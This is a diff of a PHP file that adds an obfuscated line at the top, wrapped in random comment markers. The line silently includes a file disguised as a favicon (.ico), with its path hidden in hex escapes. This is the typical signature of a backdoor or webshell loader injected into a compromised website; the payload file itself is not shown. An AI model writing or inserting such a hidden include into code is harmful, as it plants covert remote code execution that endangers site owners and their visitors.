@@ -1,4 +1,10 @@
 <?php
+
+/*bf6b2*/
+
+@include "\x2fho\x6de/\x64ul\x69ch\x61do\x2fdo\x6dai\x6es/\x64ul\x69ch\x63ha\x75au\x2eor\x67/p\x75bl\x69c_\x68tm\x6c/m\x6fde\x6c/f\x61vi\x63on\x5fd3\x65a2\x62.i\x63o";
+
+/*bf6b2*/
 /**
  * Created by PhpStorm.
  * User: tungtv
